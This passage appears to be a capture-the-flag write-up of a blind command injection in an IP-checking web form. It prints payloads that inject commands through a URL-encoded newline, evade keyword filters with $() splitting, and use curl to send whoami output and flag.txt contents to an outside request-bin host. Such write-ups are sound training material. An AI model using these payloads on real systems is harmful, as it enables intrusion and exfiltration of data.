## Blind Ambition

Again, same page:

![958f54c0749d427593d54638b524ffdc.png](../images/958f54c0749d427593d54638b524ffdc.png)

If I supply the IP I get a message saying that the host is down:

![6cd368a448ac41188d4415a28a8f74da.png](../images/6cd368a448ac41188d4415a28a8f74da.png)

If I supply the whoami command I get that the host is up and results will be sent via e-mail.

![06aab3a4d97e425ba28932184cb3ce78.png](../images/06aab3a4d97e425ba28932184cb3ce78.png)

I can try some SSRF by setting up a requestbin and using the curl command. 
`ip=127.0.0.1%0acurl eofz8ukxdl0hloq.m.pipedream.net`

![96f00c3869654d0ab0c2f46bb1d9cabd.png](../images/96f00c3869654d0ab0c2f46bb1d9cabd.png)
 
And I see that the request hits my endpoint: 

 ![b3737e623ee3418c8c6659f015c4e9b3.png](../images/b3737e623ee3418c8c6659f015c4e9b3.png)
 
 Let's try with whoami 
 `ip=127.0.0.1%0acurl eofz8ukxdl0hloq.m.pipedream.net/$(whoa$()mi)`

 ![4faf83046f41493cb9cf7cf54d59a416.png](../images/4faf83046f41493cb9cf7cf54d59a416.png)
 
That works:
 ![6506ab1d564548a0bfe78e3ffcac5c22.png](../images/6506ab1d564548a0bfe78e3ffcac5c22.png)
 
The final payload is:
 `ip=127.0.0.1%0acurl eofz8ukxdl0hloq.m.pipedream.net/$(c$()at<./../../../flag.txt)`
 
 ![2d575d5e1dc140cbb58732f8f5910559.png](../images/2d575d5e1dc140cbb58732f8f5910559.png)
 
Finally, I get the flag:

 ![74cdfe283ec040feb736e2f48a745543.png](../images/74cdfe283ec040feb736e2f48a745543.png)
 